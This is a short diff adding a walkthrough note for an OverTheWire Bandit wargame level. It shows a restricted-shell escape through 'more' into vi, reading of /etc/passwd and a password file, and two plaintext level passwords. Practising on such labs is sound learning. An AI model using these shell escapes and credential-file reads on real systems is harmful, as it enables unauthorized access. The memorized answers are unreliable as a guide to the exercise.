@@ -1,0 +1,32 @@
+$ ssh bandit.labs.overthewire.org -l bandit25 -p 2220
+pw: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+$ ls
+(ssh key provided)
+#still need to get shell
+$ cat /etc/passwd | grep bandit26
+(shows that bandit26 has a showtext file instead of /bin/bash)
+$ cat /usr/bin/showtext
+
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+
+(reduce screen size and ssh into bandit26)
+(it will then enable more, press v in more to enter vi)
+(in vi)
+
+:e /etc/bandit_pass/bandit26
+(opens that file)
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+(set shell value of vi from showtext to /bin/bash)
+
+:set shell=/bin/bash
+
+:shell
+(you will get shell)
